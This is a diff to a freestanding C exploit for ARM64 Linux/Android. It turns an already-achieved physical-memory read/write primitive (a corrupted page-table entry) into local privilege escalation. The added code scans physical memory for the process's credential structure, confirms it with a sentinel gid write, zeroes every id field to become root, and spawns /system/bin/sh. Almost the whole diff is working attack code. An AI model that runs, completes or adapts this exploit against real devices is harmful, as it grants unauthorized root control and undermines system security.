@@ -17,7 +17,7 @@ Built freestanding with linux_syscall_support.h — no libc.
 #define SYS_INLINE_SYSCALL 1
 static int my_errno;
 #define SYS_ERRNO my_errno
-#include "../linux_syscall_support.h"
+#include "linux_syscall_support.h"
 
 typedef unsigned long      uint64_t;
 typedef long               int64_t;
@@ -95,6 +95,15 @@ static void p_hex(uint64_t v, int digits) {
 
 static void p_hex64(uint64_t v) { p_str("0x"); p_hex(v, 16); }
 static void p_nl(void)          { p_str("\n"); }
+
+static void p_dec(uint64_t v, int digits) {
+    char buf[20];
+    for (int i = digits - 1; i >= 0; i--) {
+        buf[i] = '0' + (v % 10);
+        v /= 10;
+    }
+    sys_write(STDOUT, buf, digits);
+}
 
 static void die(const char *msg) {
     sys_write(STDERR, msg, str_len(msg));
@@ -236,38 +245,99 @@ void _start(void) {
     p_hex64((uint64_t)(uintptr_t)glitched_map);
     p_nl();
 
-    /* ----- validate the physmem r/w primitive -----
-       sweep every 4 KiB in the DRAM range, count and sample non-zero pages */
-    p_str("[*] Sweeping physmem and dumping samples...\n");
-    uint64_t hits = 0;
-    for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END; paddr += 0x1000) {
+    /* ----- LPE: layout-agnostic cred patch -----
+       Snapshot our 8 cred id values, scan physmem for that 32-byte block
+       (uid,gid,suid,sgid,euid,egid,fsuid,fsgid). On each candidate, write a
+       sentinel sgid and call getresgid — if our own saved gid changes,
+       we found our cred. Then zero the 32-byte block (uid=gid=...=0). */
+
+    uint32_t ruid, euid_, suid_;
+    uint32_t rgid, egid_, sgid_;
+    sys_getresuid((uid_t *)&ruid, (uid_t *)&euid_, (uid_t *)&suid_);
+    sys_getresgid((gid_t *)&rgid, (gid_t *)&egid_, (gid_t *)&sgid_);
+    uint32_t fsuid_ = (uint32_t)sys_setfsuid((uid_t)-1);
+    uint32_t fsgid_ = (uint32_t)sys_setfsgid((gid_t)-1);
+
+    p_str("[*] my ids: ");
+    p_str("ruid=");   p_hex(ruid,   8);
+    p_str(" rgid=");  p_hex(rgid,   8);
+    p_str(" suid=");  p_hex(suid_,  8);
+    p_str(" sgid=");  p_hex(sgid_,  8);
+    p_str(" euid=");  p_hex(euid_,  8);
+    p_str(" egid=");  p_hex(egid_,  8);
+    p_str(" fsuid="); p_hex(fsuid_, 8);
+    p_str(" fsgid="); p_hex(fsgid_, 8);
+    p_nl();
+
+    /* The 8 expected values are kept as separate scalars so the compiler can
+       hold them in registers — no contiguous 32-byte copy of the needle in
+       our process memory for the sweep to false-positive on. */
+
+    p_str("[*] Scanning physmem for our cred...\n");
+
+    int found = 0;
+    for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END && !found; paddr += 0x1000) {
         *glitched_pte = (orig_pte & PTE_ATTRS_MASK) | (paddr & PTE_OA_MASK);
         flush_tlb();
 
-        uint64_t v = *(volatile uint64_t *)glitched_map;
-
-        if ((paddr & 0xffffff) == 0) { /* every 16 MiB */
+        if ((paddr & 0x3fffff) == 0) { /* every 4 MiB */
+            uint64_t pct = (paddr - PHYS_MEM_BASE) * 100 / (PHYS_MEM_END - PHYS_MEM_BASE);
             p_str("\r[*] phys=");
             p_hex64(paddr);
-            p_str(" first_qword=");
-            p_hex64(v);
-            p_str(" hits=");
-            p_hex(hits, 8);
+            p_str(" (");
+            p_dec(pct, 3);
+            p_str("%)");
         }
 
-        if (v != 0 && v != 0x4141414141414141UL) {
-            hits++;
+        for (size_t off = 0; off + 32 <= 0x1000; off += 4) {
+            volatile uint32_t *p = (volatile uint32_t *)(glitched_map + off);
+            if (p[0] != ruid)   continue;
+            if (p[1] != rgid)   continue;
+            if (p[2] != suid_)  continue;
+            if (p[3] != sgid_)  continue;
+            if (p[4] != euid_)  continue;
+            if (p[5] != egid_)  continue;
+            if (p[6] != fsuid_) continue;
+            if (p[7] != fsgid_) continue;
+
+            /* candidate — write a sentinel sgid, ask the kernel what our
+               saved gid is. if it agrees we just patched our own cred. */
+            p[3] = 0x1337;
+            __asm__ volatile("dmb ish" ::: "memory");
+
+            uint32_t r2, e2, s2;
+            sys_getresgid((gid_t *)&r2, (gid_t *)&e2, (gid_t *)&s2);
+
+            if (s2 == 0x1337) {
+                p_str("\n[+] our cred at PA=");
+                p_hex64(paddr + off);
+                p_nl();
+                /* uid..fsgid all zero */
+                for (int k = 0; k < 8; k++) p[k] = 0;
+                __asm__ volatile("dmb ish" ::: "memory");
+                found = 1;
+                break;
+            } else {
+                /* not us — restore */
+                p[3] = sgid_;
+                __asm__ volatile("dmb ish" ::: "memory");
+            }
         }
     }
-    p_nl();
-    p_str("[+] Total non-zero pages in DRAM: ");
-    p_hex(hits, 8);
-    p_nl();
 
-    /* restore the PTE; not strictly necessary but keeps Linux happier */
     *glitched_pte = orig_pte;
 
-    p_str("[+] physmem r/w primitive looks good\n");
-    sys_exit_group(0);
+    if (!found) {
+        p_str("\n[-] couldn't find our cred\n");
+        sys_exit_group(1);
+        __builtin_unreachable();
+    }
+
+    p_str("[+] uid=0! exec'ing /system/bin/sh\n");
+    const char *const argv[] = { "/system/bin/sh", 0 };
+    const char *const envp[] = { 0 };
+    sys_execve("/system/bin/sh", argv, envp);
+    p_str("[-] execve failed\n");
+    sys_exit_group(1);
     __builtin_unreachable();
 }
